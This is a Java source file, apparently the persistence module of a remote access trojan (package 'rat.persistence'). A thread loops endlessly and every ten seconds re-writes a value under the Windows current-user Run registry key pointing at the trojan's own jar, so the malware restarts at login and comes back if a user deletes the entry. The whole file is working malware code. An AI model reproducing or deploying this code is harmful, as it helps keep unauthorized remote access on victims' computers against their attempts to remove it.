package rat.persistence;

import rat.ClientMain;
import rat.persistence.util.WinRegistry;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.net.URISyntaxException;

public class Startup implements Runnable
{
    private String keyName;

    public Startup(String keyName)
    {
        this.keyName = keyName;
    }

    @Override
    public void run()
    {
        while (true)
        {
            if (!startupKeyExists(keyName))
            {
                createWindowsStartupKey(keyName);
            }

            try
            {
                Thread.sleep(10000L);
            }
            catch (InterruptedException e)
            {
                e.printStackTrace();
            }
        }
    }

    private boolean startupKeyExists(String keyName)
    {
        try
        {
            String userKey = WinRegistry.readString(WinRegistry.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    keyName,
                    WinRegistry.KEY_WOW64_32KEY);
            return userKey != null;
        }
        catch (IllegalAccessException e)
        {
            e.printStackTrace();
        }
        catch (InvocationTargetException e)
        {
            e.printStackTrace();
        }
        return false;
    }

    private void createWindowsStartupKey(String keyName)
    {
        try
        {
            WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    keyName,
                    "\"" + jarLocationOnDisc() + "\"",
                    WinRegistry.KEY_WOW64_32KEY);
        }
        catch (IllegalAccessException e)
        {
            e.printStackTrace();
        }
        catch (InvocationTargetException e)
        {
            e.printStackTrace();
        }
        catch (URISyntaxException e)
        {
            e.printStackTrace();
        }

    }

    public static String jarLocationOnDisc() throws URISyntaxException
    {
        return new File(ClientMain.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getAbsolutePath();
    }
}
